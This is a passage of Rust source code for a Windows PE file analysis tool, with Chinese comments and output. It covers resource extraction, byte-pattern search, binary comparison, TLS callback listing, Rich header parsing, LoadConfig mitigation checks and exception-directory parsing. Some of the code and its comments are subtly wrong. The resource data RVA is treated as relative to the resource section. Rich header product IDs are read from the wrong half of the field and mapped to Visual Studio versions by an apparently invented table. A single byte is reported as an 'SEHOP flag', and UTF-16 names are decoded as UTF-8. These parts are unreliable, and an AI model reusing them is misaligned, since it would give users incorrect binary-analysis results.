                        _ => (format!("db 0x0F,0x1F,0x{:02X}", data[cur+2]), cur - offset + 3),
                    }
                }
                0xB6 if cur + 2 < data.len() => {
                    let (_, reg, _) = get_modrm(cur+2);
                    let rm = modrm_str(cur+2, 1);
                    (format!("movzx {}, {}", reg_name(reg, rex_r), rm), cur - offset + 3 + modrm_size(&data, cur+2))
                }
                _ => (format!("db 0x0F,0x{:02X}", data[cur+1]), cur - offset + 2),
            }
        }
        _ => (format!("db 0x{:02X}", op), cur - offset + 1),
    }
}

fn modrm_size(data: &[u8], offset: usize) -> usize {
    if offset >= data.len() { return 0; }
    let (mod_, _reg, rm) = (data[offset] >> 6, (data[offset] >> 3) & 7, data[offset] & 7);
    match mod_ {
        0 => if rm == 5 { 4 } else if rm == 4 { 1 } else { 0 },
        1 => 1,
        2 => 4,
        3 => 0,
        _ => 0,
    }
}

// ═══════════════ 资源提取 v3.1 ═══════════════

fn resource_dump(path: &str, extract_type: Option<&str>, output_dir: Option<&str>) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    if data.len() < 64 || u16_le(&data, 0) != 0x5A4D { return Err("无效PE".into()); }
    let pe_off = u32_le(&data, 0x3C) as usize;
    let coff = pe_off + 4;
    let opt_start = coff + 20;
    let magic = u16_le(&data, opt_start);
    let dd_start = opt_start + if magic == 0x20B { 112 } else { 96 };
    let rsrc_rva = u32_le(&data, dd_start + 16);
    let _rsrc_size = u32_le(&data, dd_start + 20);
    if rsrc_rva == 0 { return Err("无资源段".into()); }

    let num_sections = u16_le(&data, coff + 2) as usize;
    let sec_start = coff + 20 + u16_le(&data, coff + 16) as usize;
    let mut sections = Vec::new();
    for i in 0..num_sections {
        let o = sec_start + i * 40;
        sections.push((u32_le(&data, o+12), u32_le(&data, o+8), u32_le(&data, o+20), u32_le(&data, o+16)));
    }

    let mut rsrc_off = None;
    for &(va, vs, ro, rs) in &sections {
        if rsrc_rva >= va && rsrc_rva < va + vs.max(rs) && rs > 0 {
            rsrc_off = Some((ro + (rsrc_rva - va)) as usize); break;
        }
    }
    let base = rsrc_off.ok_or("无法定位资源段")?;

    fn rva_to_res_off(base_rva: u32, data_rva: u32, sections: &[(u32,u32,u32,u32)]) -> Option<usize> {
        // 资源数据条目的RVA是相对于资源段基址的
        let abs_rva = base_rva + data_rva;
        for &(va, _vs, ro, rs) in sections {
            if abs_rva >= va && rs > 0 && (abs_rva - va) < rs {
                return Some((ro + (abs_rva - va)) as usize);
            }
        }
        None
    }

    let rtypes: [(u32, &str); 12] = [
        (1, "RT_CURSOR"), (2, "RT_BITMAP"), (3, "RT_ICON"), (4, "RT_MENU"),
        (5, "RT_DIALOG"), (6, "RT_STRING"), (7, "RT_FONTDIR"), (8, "RT_FONT"),
        (9, "RT_ACCELERATOR"), (10, "RT_RCDATA"), (16, "RT_VERSION"), (24, "RT_MANIFEST"),
    ];

    let mut out = format!("═══ 资源提取: {} ═══\n\n", path);
    let mut resources: Vec<(String, String, usize, usize)> = Vec::new(); // (type, name, file_off, size)

    // Level 1: Type directory (IMAGE_RESOURCE_DIRECTORY)
    if base + 16 > data.len() { return Err("资源目录越界".into()); }
    let n_named = u16_le(&data, base + 12) as usize;
    let n_id = u16_le(&data, base + 14) as usize;
    let total_types = n_named + n_id;

    for t in 0..total_types.min(50) {
        let entry_off = base + 16 + t * 8;
        if entry_off + 8 > data.len() { break; }
        let name_or_id = u32_le(&data, entry_off);
        let offset_to_data = u32_le(&data, entry_off + 4);

        let type_name = if name_or_id & 0x80000000 != 0 {
            let name_off = base + (name_or_id & 0x7FFFFFFF) as usize;
            if name_off + 2 < data.len() {
                let len = u16_le(&data, name_off) as usize;
                String::from_utf8_lossy(&data[name_off+2..name_off+2+len*2]).to_string()
            } else { format!("Name(0x{:08X})", name_or_id) }
        } else {
            rtypes.iter().find(|(id,_)| *id == name_or_id).map(|(_,n)| n.to_string())
                .unwrap_or_else(|| format!("Type({})", name_or_id))
        };

        // Level 2: Name/ID directory
        let l2_off = base + (offset_to_data & 0x7FFFFFFF) as usize;
        if l2_off + 16 > data.len() { continue; }
        let n2_named = u16_le(&data, l2_off + 12) as usize;
        let n2_id = u16_le(&data, l2_off + 14) as usize;
        let total_names = n2_named + n2_id;

        for n in 0..total_names.min(30) {
            let e2_off = l2_off + 16 + n * 8;
            if e2_off + 8 > data.len() { break; }
            let res_name_or_id = u32_le(&data, e2_off);
            let l3_ofs = u32_le(&data, e2_off + 4);

            let res_name = if res_name_or_id & 0x80000000 != 0 {
                let no = base + (res_name_or_id & 0x7FFFFFFF) as usize;
                if no + 2 < data.len() {
                    let len = u16_le(&data, no) as usize;
                    String::from_utf8_lossy(&data[no+2..no+2+len*2]).to_string()
                } else { format!("#{}", res_name_or_id & 0x7FFF) }
            } else {
                format!("#{}", res_name_or_id)
            };

            // Level 3: Data entry
            let l3_off = base + (l3_ofs & 0x7FFFFFFF) as usize;
            if l3_off + 8 > data.len() { continue; }
            let data_rva = u32_le(&data, l3_off);
            let res_size = u32_le(&data, l3_off + 4) as usize;
            let res_file_off = rva_to_res_off(rsrc_rva, data_rva, &sections).unwrap_or(0);

            out.push_str(&format!("  {:20} {:20}  off=0x{:08X}  {}B\n", type_name, res_name, res_file_off, res_size));
            resources.push((type_name.clone(), res_name, res_file_off, res_size));
        }
    }

    out.push_str(&format!("\n[·] 共 {} 个资源\n", resources.len()));

    // 提取
    let et = extract_type.unwrap_or("all");
    if et != "all" {
        let out_dir = output_dir.unwrap_or(".");
        let out_path = std::path::Path::new(out_dir);
        let _ = std::fs::create_dir_all(out_path);
        let mut extracted = 0usize;
        let type_filter = match et {
            "icon" => "RT_ICON", "bitmap" => "RT_BITMAP", "manifest" => "RT_MANIFEST",
            "version" => "RT_VERSION", _ => et,
        };
        for (typ, name, off, size) in &resources {
            if typ.contains(type_filter) || type_filter == et {
                let fname = out_path.join(format!("{}_{}.bin", typ, name));
                if *off > 0 && off + size <= data.len() {
                    std::fs::write(&fname, &data[*off..*off+size]).ok();
                    extracted += 1;
                }
            }
        }
        out.push_str(&format!("[+] 提取 {} 个资源 → {}\n", extracted, out_dir));
    }

    Ok(out)
}

// ═══════════════ 字节模式搜索 v3.1 ═══════════════

fn byte_search(path: &str, hex_pattern: &str) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    // Parse pattern: "AA BB ?? CC" → bytes + mask
    let mut pattern = Vec::new();
    let mut mask = Vec::new();
    for part in hex_pattern.split_whitespace() {
        let part = part.trim();
        if part == "?" || part == "??" {
            pattern.push(0u8);
            mask.push(false);
        } else if part.len() == 2 {
            if let Ok(b) = u8::from_str_radix(part, 16) {
                pattern.push(b);
                mask.push(true);
            }
        } else if part.len() > 2 {
            // 尝试解析
            if let Ok(b) = u8::from_str_radix(&part[..2], 16) {
                pattern.push(b);
                mask.push(true);
            }
        }
    }
    if pattern.is_empty() { return Err("无效HEX模式".into()); }

    let mut out = format!("═══ 字节搜索: {} ═══\n", path);
    out.push_str(&format!("[·] 模式: {} ({}B, {}个通配符)\n\n", hex_pattern, pattern.len(),
        mask.iter().filter(|&&m| !m).count()));

    let mut matches = 0usize;
    let max_matches = 200;
    let mut i = 0;
    while i + pattern.len() <= data.len() && matches < max_matches {
        let mut found = true;
        for (j, (&b, &m)) in pattern.iter().zip(mask.iter()).enumerate() {
            if m && data[i + j] != b { found = false; break; }
        }
        if found {
            let ctx_start = i.saturating_sub(4);
            let ctx_end = (i + pattern.len() + 8).min(data.len());
            let ctx: String = data[ctx_start..ctx_end].iter()
                .map(|&b| if b.is_ascii_graphic() || b == b' ' { b as char } else { '.' })
                .collect();
            let hex_ctx: String = data[ctx_start..ctx_end].iter()
                .map(|b| format!("{:02X}", b)).collect::<Vec<_>>().join(" ");
            out.push_str(&format!("  [+] 0x{:08X} | {} | {}\n", i, hex_ctx, ctx));
            matches += 1;
        }
        i += 1;
    }

    if matches >= max_matches {
        out.push_str(&format!("\n[!] 已达上限 {} 条, 截断输出\n", max_matches));
    }
    out.push_str(&format!("\n[*] 共 {} 处匹配\n", matches));
    Ok(out)
}

// ═══════════════ PE二进制对比 v3.1 ═══════════════

fn pe_compare(path1: &str, path2: &str) -> Result<String, String> {
    let d1 = std::fs::read(path1).map_err(|e| format!("读取{}失败: {}", path1, e))?;
    let d2 = std::fs::read(path2).map_err(|e| format!("读取{}失败: {}", path2, e))?;
    if d1.len() < 64 || u16_le(&d1, 0) != 0x5A4D { return Err("文件1非PE".into()); }
    if d2.len() < 64 || u16_le(&d2, 0) != 0x5A4D { return Err("文件2非PE".into()); }

    let mut out = format!("═══ PE对比: {} vs {} ═══\n\n", path1, path2);
    out.push_str(&format!("[·] 文件1: {}KB | 文件2: {}KB\n\n", d1.len()/1024, d2.len()/1024));

    // 整体相似度
    let mut same_bytes = 0usize;
    let total = d1.len().min(d2.len());
    for i in 0..total { if d1[i] == d2[i] { same_bytes += 1; } }
    let similarity = same_bytes as f64 / total as f64 * 100.0;
    out.push_str(&format!("─── 整体对比 ───\n"));
    out.push_str(&format!("[·] 相同字节: {} / {} ({:.1}%)\n", same_bytes, total, similarity));
    out.push_str(&format!("[·] 差异字节: {}\n\n", total - same_bytes));

    // Parse both PEs
    let parse_pe = |d: &[u8]| -> Result<(bool, Vec<(String,u32,u32,u32,u32,u32)>, Vec<(String,Vec<String>)>, Vec<(u16,String)>, u64), String> {
        let po = u32_le(d, 0x3C) as usize;
        let coff = po + 4;
        let opt = coff + 20;
        let magic = u16_le(d, opt);
        let x64 = magic == 0x20B;
        let dd = opt + if x64 { 112 } else { 96 };
        let ns = u16_le(d, coff + 2) as usize;
        let sec_s = coff + 20 + u16_le(d, coff + 16) as usize;
        let mut secs = Vec::new();
        for i in 0..ns {
            let o = sec_s + i * 40;
            secs.push((String::from_utf8_lossy(&d[o..o+8]).trim_end_matches('\0').to_string(),
                u32_le(d,o+12), u32_le(d,o+8), u32_le(d,o+20), u32_le(d,o+16), u32_le(d,o+36)));
        }
        let import_rva = u32_le(d, dd + 8);
        let mut imps = Vec::new();
        if import_rva > 0 {
            for (_, va, vs, ro, rs, _) in &secs {
                if import_rva >= *va && import_rva < va + (*vs).max(*rs) && *rs > 0 {
                    if let Ok(im) = parse_imports(d, (ro + (import_rva - va)) as usize, &secs) { imps = im; }
                }
            }
        }
        let export_rva = u32_le(d, dd);
        let mut exps = Vec::new();
        if export_rva > 0 {
            for (_, va, vs, ro, rs, _) in &secs {
                if export_rva >= *va && export_rva < va + (*vs).max(*rs) && *rs > 0 {
                    if let Ok((_, ef)) = parse_exports(d, (ro + (export_rva - va)) as usize, &secs) { exps = ef; }
                }
            }
        }
        let ib = if x64 { u64_le(d, opt + 24) } else { u32_le(d, opt + 28) as u64 };
        Ok((x64, secs, imps, exps, ib))
    };

    let (_, s1, i1, e1, _) = parse_pe(&d1)?;
    let (_, s2, i2, e2, _) = parse_pe(&d2)?;

    // Section comparison
    out.push_str("─── 节对比 ───\n");
    let mut sec_same = 0usize;
    for (n1, va1, vs1, _ro1, rs1, c1) in &s1 {
        for (n2, va2, vs2, _ro2, rs2, c2) in &s2 {
            if n1 == n2 {
                let diffs = [(*va1!=*va2),(*vs1!=*vs2),(*rs1!=*rs2),(*c1!=*c2)].iter().filter(|&&d| d).count();
                if diffs == 0 { sec_same += 1; }
                else {
                    out.push_str(&format!("  [*] {}: VA:{}/{} VSz:{}/{} RSz:{}/{} Ch:{:08X}/{:08X}\n",
                        n1, va1, va2, vs1, vs2, rs1, rs2, c1, c2));
                }
            }
        }
    }
    let sec_only1: Vec<_> = s1.iter().filter(|(n,_,_,_,_,_)| !s2.iter().any(|(n2,_,_,_,_,_)| n==n2)).map(|(n,_,_,_,_,_)| n).collect();
    let sec_only2: Vec<_> = s2.iter().filter(|(n,_,_,_,_,_)| !s1.iter().any(|(n2,_,_,_,_,_)| n==n2)).map(|(n,_,_,_,_,_)| n).collect();
    if !sec_only1.is_empty() { out.push_str(&format!("  [-] 仅文件1: {}\n", sec_only1.iter().map(|s| s.as_str()).collect::<Vec<_>>().join(", "))); }
    if !sec_only2.is_empty() { out.push_str(&format!("  [+] 仅文件2: {}\n", sec_only2.iter().map(|s| s.as_str()).collect::<Vec<_>>().join(", "))); }
    out.push_str(&format!("[·] 相同节: {}/{}\n\n", sec_same, s1.len()));

    // Import comparison
    out.push_str("─── 导入表对比 ───\n");
    let imp1_dlls: Vec<_> = i1.iter().map(|(d,_)| d.clone()).collect();
    let imp2_dlls: Vec<_> = i2.iter().map(|(d,_)| d.clone()).collect();
    let imp_common: Vec<_> = imp1_dlls.iter().filter(|d| imp2_dlls.contains(d)).collect();
    let imp_only1: Vec<_> = imp1_dlls.iter().filter(|d| !imp2_dlls.contains(d)).collect();
    let imp_only2: Vec<_> = imp2_dlls.iter().filter(|d| !imp1_dlls.contains(d)).collect();
    out.push_str(&format!("[·] 共同DLL: {} | 仅文件1: {} | 仅文件2: {}\n", imp_common.len(), imp_only1.len(), imp_only2.len()));
    for d in &imp_only1 { out.push_str(&format!("  [-] {}\n", d)); }
    for d in &imp_only2 { out.push_str(&format!("  [+] {}\n", d)); }

    // Per-common-DLL function diffs
    for cd in &imp_common {
        let f1: Vec<_> = i1.iter().filter(|(d,_)| d==*cd).flat_map(|(_,f)| f.iter()).collect();
        let f2: Vec<_> = i2.iter().filter(|(d,_)| d==*cd).flat_map(|(_,f)| f.iter()).collect();
        let fonly1: Vec<_> = f1.iter().filter(|f| !f2.contains(f)).collect();
        let fonly2: Vec<_> = f2.iter().filter(|f| !f1.contains(f)).collect();
        if !fonly1.is_empty() || !fonly2.is_empty() {
            out.push_str(&format!("  [{}] ", cd));
            for f in &fonly1 { out.push_str(&format!("-{} ", f)); }
            for f in &fonly2 { out.push_str(&format!("+{} ", f)); }
            out.push_str("\n");
        }
    }

    // Export comparison
    if !e1.is_empty() || !e2.is_empty() {
        out.push_str("\n─── 导出表对比 ───\n");
        let en1: Vec<_> = e1.iter().map(|(_,n)| n.clone()).collect();
        let en2: Vec<_> = e2.iter().map(|(_,n)| n.clone()).collect();
        let eonly1: Vec<_> = en1.iter().filter(|n| !en2.contains(n)).collect();
        let eonly2: Vec<_> = en2.iter().filter(|n| !en1.contains(n)).collect();
        out.push_str(&format!("[·] 仅文件1: {} | 仅文件2: {}\n", eonly1.len(), eonly2.len()));
        for n in &eonly1 { out.push_str(&format!("  [-] {}\n", n)); }
        for n in &eonly2 { out.push_str(&format!("  [+] {}\n", n)); }
    }

    out.push_str(&format!("\n─── 总结: {:.1}% 相似度 ───\n", similarity));
    Ok(out)
}

// ═══════════════ TLS回调分析 v3.2 ═══════════════

fn tls_analyze(path: &str) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    if data.len() < 64 || u16_le(&data, 0) != 0x5A4D { return Err("无效PE".into()); }
    let pe_off = u32_le(&data, 0x3C) as usize;
    let coff = pe_off + 4;
    let opt_start = coff + 20;
    let magic = u16_le(&data, opt_start);
    let is_x64 = magic == 0x20B;
    let dd_start = opt_start + if is_x64 { 112 } else { 96 };
    let tls_rva = u32_le(&data, dd_start + 72);
    let _tls_size = u32_le(&data, dd_start + 76);
    if tls_rva == 0 { return Err("无TLS目录".into()); }

    let num_sections = u16_le(&data, coff + 2) as usize;
    let sec_start = coff + 20 + u16_le(&data, coff + 16) as usize;
    let mut sections = Vec::new();
    for i in 0..num_sections {
        let o = sec_start + i * 40;
        sections.push((u32_le(&data, o+12), u32_le(&data, o+8), u32_le(&data, o+20), u32_le(&data, o+16)));
    }

    fn rva_off(rva: u32, secs: &[(u32,u32,u32,u32)]) -> Option<usize> {
        for &(va, vs, ro, rs) in secs {
            if rva >= va && rva < va + vs.max(rs) && rs > 0 {
                return Some((ro + (rva - va)) as usize);
            }
        }
        None
    }

    let tls_off = rva_off(tls_rva, &sections).ok_or("无法定位TLS目录")?;
    let _image_base = if is_x64 { u64_le(&data, opt_start + 24) } else { u32_le(&data, opt_start + 28) as u64 };

    // IMAGE_TLS_DIRECTORY: StartAddressOfRawData/EndAddressOfRawData/AddressOfIndex/AddressOfCallBacks/SizeOfZeroFill/Characteristics
    let cb_rva_offset = if is_x64 { 24 } else { 12 }; // AddressOfCallBacks
    let cb_rva = if is_x64 {
        u64_le(&data, tls_off + cb_rva_offset) as u32
    } else {
        u32_le(&data, tls_off + cb_rva_offset)
    };

    let mut out = format!("═══ TLS回调分析: {} ═══\n\n", path);
    out.push_str(&format!("[·] TLS目录RVA: 0x{:08X}\n", tls_rva));
    out.push_str(&format!("[·] 架构: {}\n\n", if is_x64 { "x64" } else { "x86" }));

    if cb_rva == 0 {
        out.push_str("[+] 无TLS回调 — 未使用TLS反调试\n");
        return Ok(out);
    }

    if let Some(cb_off) = rva_off(cb_rva, &sections) {
        let mut cb_count = 0u32;
        out.push_str("─── TLS回调函数 ───\n");
        loop {
            let entry_off = cb_off + cb_count as usize * if is_x64 { 8 } else { 4 };
            if entry_off + 8 > data.len() { break; }
            let addr = if is_x64 {
                u64_le(&data, entry_off)
            } else {
                u32_le(&data, entry_off) as u64
            };
            if addr == 0 { break; }
            out.push_str(&format!("  [{}.] VA: 0x{:016X}\n", cb_count + 1, addr));
            cb_count += 1;
            if cb_count > 50 { out.push_str("  [·] ...(截断)\n"); break; }
        }
        out.push_str(&format!("\n[·] 总计: {} 个TLS回调\n", cb_count));
        if cb_count > 0 {
            out.push_str("[!] ⚠ TLS回调在main/CRT之前执行 — 常用于:\n");
            out.push_str("    - 反调试检测 (IsDebuggerPresent/NtQueryInformationProcess)\n");
            out.push_str("    - 反分析 (检测断点/单步/虚拟机)\n");
            out.push_str("    - 隐蔽初始化 (payload在入口点前执行)\n");
            out.push_str("    - 进程注入/持久化触发\n");
        }
    }

    Ok(out)
}

// ═══════════════ Rich Header解析 v3.2 ═══════════════

fn rich_header(path: &str) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    if data.len() < 128 || u16_le(&data, 0) != 0x5A4D { return Err("无效PE".into()); }

    // Rich header位于DOS stub和PE签名之间, 以"Rich"标记结尾
    // 搜索 "Rich" 签名在偏移 0x80..PE_OFF 之间
    let pe_off = u32_le(&data, 0x3C) as usize;

    // 从PE头往回找 "Rich"
    let mut rich_end = None;
    for i in (64..pe_off.min(data.len())).rev() {
        if i + 4 <= data.len() && &data[i..i+4] == b"Rich" {
            rich_end = Some(i);
            break;
        }
    }

    let rich_pos = match rich_end {
        Some(p) => p,
        None => return Err("未发现Rich Header — 可能非MSVC编译".into()),
    };

    // Rich header结构: ... comp_ids (每组8B: 4B comp_id XOR key, 4B count XOR key)
    // 前面4B: "DanS" XOR key = key
    // 后面4B: key (破解用)
    // 再后面4B: "Rich"
    if rich_pos < 8 || rich_pos + 8 > data.len() { return Err("Rich Header损坏".into()); }
    let key = u32_le(&data, rich_pos + 4);
    let dans_xor = u32_le(&data, rich_pos - 4);
    if dans_xor ^ key != 0x536E6144 { // "DanS"
        return Err("Rich Header密钥验证失败".into());
    }

    let mut out = format!("═══ Rich Header: {} ═══\n\n", path);
    out.push_str(&format!("[·] 位置: 0x{:08X}\n", rich_pos));
    out.push_str(&format!("[·] 密钥: 0x{:08X}\n\n", key));

    // 解析 comp_id 数组 (从 "DanS" 前逆向)
    // 每组 8B: [DWORD comp_id ^ key] [DWORD count ^ key]
    // 数组起始未知, 从 rich_pos-8 往回, 直到遇到 "DanS" 标记
    let data_start = rich_pos - 8;
    let _dans_marker = rich_pos - 4; // "DanS" ^ key

    // 找到数组起始: 从 data_start 往前, 直到遇到等于 dans_marker 的位置前一个
    let mut array_start = None;
    for i in (20..data_start).rev().step_by(8) {
        if i + 4 <= data.len() && u32_le(&data, i) == dans_xor {
            array_start = Some(i + 8);
            break;
        }
    }

    let start = array_start.unwrap_or(128); // 回退到安全起始

    out.push_str("─── 编译工具链组件 ───\n");
    out.push_str("  Comp.ID   Product          Count\n");
    out.push_str("  ───────   ───────          ─────\n");

    // Known comp_id mappings
    let products: [(u16, &str); 30] = [
        (0x0000, "Unknown"),
        (0x0001, "Import0"), (0x0002, "Linker510"), (0x0003, "Cvtomf510"),
        (0x0004, "Linker600"), (0x0005, "Cvtomf600"), (0x0006, "Cvtres500"),
        (0x0007, "Utc11_Basic"), (0x0008, "Utc11_C"), (0x0009, "Utc12_Basic"),
        (0x000A, "Utc12_C"), (0x000B, "Utc12_CPP"), (0x000C, "AliasObj60"),
        (0x000D, "VB5"), (0x000E, "MC6"), (0x000F, "CS7"),
        (0x0010, "VB6"), (0x0011, "MC7"), (0x0012, "CS8"),
        (0x0013, "VB7"), (0x0014, "MC8"), (0x0015, "CS9"),
        (0x0016, "VC8"), (0x0017, "VC9"), (0x0018, "VC10"),
        (0x0019, "VC11"), (0x001A, "VC12"), (0x001B, "VC14"),
        (0x001C, "VC15"), (0x001D, "VC16"),
    ];

    let mut i = start;
    let mut entries = Vec::new();
    while i + 8 <= rich_pos - 4 {
        let comp_id = u16_le(&data, i) as u32 ^ (key & 0xFFFF) as u32;
        let count = u32_le(&data, i + 4) ^ key;
        if comp_id == 0 && count == 0 { break; }
        if comp_id < 0x100 && count > 0 {
            entries.push((comp_id as u16, count));
        }
        i += 8;
    }
    entries.sort_by_key(|(id, _)| *id);

    for (cid, count) in &entries {
        let prod = products.iter().find(|(id,_)| *id == *cid).map(|(_,n)| *n).unwrap_or("?");
        out.push_str(&format!("  0x{:04X}   {:15}  {}\n", cid, prod, count));
    }

    if !entries.is_empty() {
        out.push_str(&format!("\n[·] {} 个组件记录\n", entries.len()));
        // 推测编译器版本
        let max_cid = entries.iter().map(|(id,_)| *id).max().unwrap_or(0);
        let vs_ver = match max_cid {
            0x1D => "Visual Studio 2022 (VC17)",
            0x1C => "Visual Studio 2019 (VC16)",
            0x1B => "Visual Studio 2017 (VC15)",
            0x1A => "Visual Studio 2015 (VC14)",
            0x19 => "Visual Studio 2013 (VC12)",
            0x18 => "Visual Studio 2012 (VC11)",
            0x17 => "Visual Studio 2010 (VC10)",
            0x16 => "Visual Studio 2008 (VC9)",
            _ => "较旧版本",
        };
        out.push_str(&format!("[·] 推测工具链: {}\n", vs_ver));
    }

    Ok(out)
}

// ═══════════════ LoadConfig 分析 v3.2 ═══════════════

fn loadconfig_analyze(path: &str) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    if data.len() < 64 || u16_le(&data, 0) != 0x5A4D { return Err("无效PE".into()); }
    let pe_off = u32_le(&data, 0x3C) as usize;
    let coff = pe_off + 4;
    let opt_start = coff + 20;
    let magic = u16_le(&data, opt_start);
    let is_x64 = magic == 0x20B;
    let dd_start = opt_start + if is_x64 { 112 } else { 96 };
    let lc_rva = u32_le(&data, dd_start + 80);
    let lc_size = u32_le(&data, dd_start + 84);
    if lc_rva == 0 || lc_size == 0 { return Err("无LoadConfig目录".into()); }

    let num_sections = u16_le(&data, coff + 2) as usize;
    let sec_start = coff + 20 + u16_le(&data, coff + 16) as usize;
    let mut sections = Vec::new();
    for i in 0..num_sections {
        let o = sec_start + i * 40;
        sections.push((u32_le(&data, o+12), u32_le(&data, o+8), u32_le(&data, o+20), u32_le(&data, o+16)));
    }

    let lc_off = {
        let mut off = None;
        for &(va, vs, ro, rs) in &sections {
            if lc_rva >= va && lc_rva < va + vs.max(rs) && rs > 0 {
                off = Some((ro + (lc_rva - va)) as usize); break;
            }
        }
        off.ok_or("无法定位LoadConfig")?
    };

    let mut out = format!("═══ LoadConfig分析: {} ═══\n\n", path);
    out.push_str(&format!("[·] LoadConfig RVA: 0x{:08X} 大小: {}B\n\n", lc_rva, lc_size));

    // IMAGE_LOAD_CONFIG_DIRECTORY — 各字段在不同版本中有不同的偏移
    // 通用字段 (x64): Size/TimeDateStamp/MajorVersion/MinorVersion/GlobalFlagsClear/GlobalFlagsSet/CriticalSectionDefaultTimeout...
    let size = u32_le(&data, lc_off) as usize;

    // SecurityCookie (offset depends on struct version)
    let get_field = |offset: usize| -> Option<u64> {
        if lc_off + offset + 8 <= data.len() && offset + 8 <= size {
            Some(u64_le(&data, lc_off + offset))
        } else if lc_off + offset + 4 <= data.len() {
            Some(u32_le(&data, lc_off + offset) as u64)
        } else { None }
    };

    // GS Cookie
    if let Some(cookie) = get_field(if is_x64 { 48 } else { 40 }) {
        out.push_str(&format!("[·] GS Cookie (SecurityCookie): 0x{:016X}\n", cookie));
        if cookie == 0 { out.push_str("     [-] GS 栈保护: 未启用\n"); }
        else { out.push_str("     [+] GS 栈保护: 已启用\n"); }
    }

    // SEHOP
    if lc_size >= 64 {
        let sehop = data[lc_off + if is_x64 { 60 } else { 52 }];
        out.push_str(&format!("[·] SEHandlerTable: RVA=0x{:08X}\n",
            u32_le(&data, lc_off + if is_x64 { 56 } else { 48 })));
        out.push_str(&format!("[·] SEHOP标志: {}\n", if sehop != 0 { "[+] 已启用" } else { "[-] 未启用" }));
    }

    // CFG (Control Flow Guard) — GuardCFCheckFunctionPointer
    if let Some(cfg_check) = get_field(if is_x64 { 80 } else { 64 }) {
        out.push_str(&format!("[·] CFG CheckPtr: 0x{:016X}\n", cfg_check));
        if cfg_check != 0 { out.push_str("     [+] CFG (控制流保护): 已启用\n"); }
        else { out.push_str("     [-] CFG: 未启用\n"); }
    }

    // GuardCFFunctionTable
    if let Some(cfg_table) = get_field(if is_x64 { 96 } else { 72 }) {
        if cfg_table != 0 {
            if let Some(cfg_count) = get_field(if is_x64 { 104 } else { 76 }) {
                out.push_str(&format!("[·] CFG函数表: 0x{:016X} (约{}条)\n", cfg_table, cfg_count));
            }
        }
    }

    // RFG (Return Flow Guard)
    if size > if is_x64 { 128 } else { 96 } {
        if let Some(rfg) = get_field(if is_x64 { 120 } else { 88 }) {
            out.push_str(&format!("[·] RFG (Return Flow Guard): {}\n",
                if rfg != 0 { "[+] 已启用" } else { "[-] 未启用" }));
        }
    }

    // CET (Intel CET Shadow Stack)
    if size > if is_x64 { 160 } else { 120 } {
        let cet_off = if is_x64 { 148 } else { 108 };
        if lc_off + cet_off + 4 <= data.len() {
            let cet = u32_le(&data, lc_off + cet_off);
            out.push_str(&format!("[·] CET Compat: {} (0x{:08X})\n",
                if cet != 0 { "[+] 已启用" } else { "[-] 未启用" }, cet));
        }
    }

    // DEP/ASLR 从 DLL Characteristics (已在pe_analyze中)
    out.push_str(&format!("\n[·] LoadConfig版本: v{}\n", size / if is_x64 { 8 } else { 4 }));

    Ok(out)
}

// ═══════════════ 异常目录分析 v3.2 ═══════════════

fn exception_analyze(path: &str) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    if data.len() < 64 || u16_le(&data, 0) != 0x5A4D { return Err("无效PE".into()); }
    let pe_off = u32_le(&data, 0x3C) as usize;
    let coff = pe_off + 4;
    let opt_start = coff + 20;
    let magic = u16_le(&data, opt_start);
    let is_x64 = magic == 0x20B;
    let dd_start = opt_start + if is_x64 { 112 } else { 96 };
    let exc_rva = u32_le(&data, dd_start + 24);
    let exc_size = u32_le(&data, dd_start + 28);
    if exc_rva == 0 { return Err("无异常目录".into()); }

    let num_sections = u16_le(&data, coff + 2) as usize;
    let sec_start = coff + 20 + u16_le(&data, coff + 16) as usize;
    let mut sections = Vec::new();
    for i in 0..num_sections {
        let o = sec_start + i * 40;
        sections.push((u32_le(&data, o+12), u32_le(&data, o+8), u32_le(&data, o+20), u32_le(&data, o+16)));
    }

    let exc_off = {
        let mut off = None;
        for &(va, vs, ro, rs) in &sections {
            if exc_rva >= va && exc_rva < va + vs.max(rs) && rs > 0 {
                off = Some((ro + (exc_rva - va)) as usize); break;
            }
        }
        off.ok_or("无法定位异常目录")?
    };

    let mut out = format!("═══ 异常目录分析: {} ═══\n\n", path);
    out.push_str(&format!("[·] 异常目录RVA: 0x{:08X} 大小: {}B\n", exc_rva, exc_size));

    if is_x64 {
        // x64: IMAGE_RUNTIME_FUNCTION_ENTRY (12B each): BeginAddress/EndAddress/UnwindInfoAddress
        let entry_size = 12;
        let num_entries = (exc_size as usize).min(data.len() - exc_off) / entry_size;
        out.push_str(&format!("[·] x64 .pdata条目: {} 个 (每个12B)\n\n", num_entries));
        out.push_str("─── 前20条 ───\n");
        for i in 0..num_entries.min(20) {
            let e = exc_off + i * entry_size;
            if e + 12 > data.len() { break; }
            let begin = u32_le(&data, e);
            let end = u32_le(&data, e + 4);
            let unwind = u32_le(&data, e + 8);
            out.push_str(&format!("  {:3}. Begin=0x{:08X} End=0x{:08X} Unwind=0x{:08X}\n", i+1, begin, end, unwind));
        }
        out.push_str(&format!("\n[·] 总计: {} 个异常处理函数\n", num_entries));
    } else {
        // x86: SAFESEH — 函数表
        out.push_str(&format!("[·] x86 SafeSEH 表: {} 个条目\n", exc_size as usize / 4));
        let num_entries = (exc_size as usize / 4).min(50);
        for i in 0..num_entries {
            let e = exc_off + i * 4;
            if e + 4 > data.len() { break; }
            let handler = u32_le(&data, e);
            out.push_str(&format!("  {:3}. 0x{:08X}\n", i+1, handler));
        }
        if exc_size as usize / 4 > 50 {
            out.push_str(&format!("  [·] ...(还有{}条)\n", exc_size as usize / 4 - 50));
        }
    }

    Ok(out)
}

// ═══════════════ 绑定导入分析 v3.2 ═══════════════

fn bind_import(path: &str) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("读取失败: {}", e))?;
    if data.len() < 64 || u16_le(&data, 0) != 0x5A4D { return Err("无效PE".into()); }
    let pe_off = u32_le(&data, 0x3C) as usize;
    let coff = pe_off + 4;
    let opt_start = coff + 20;
    let magic = u16_le(&data, opt_start);
    let is_x64 = magic == 0x20B;
    let dd_start = opt_start + if is_x64 { 112 } else { 96 };
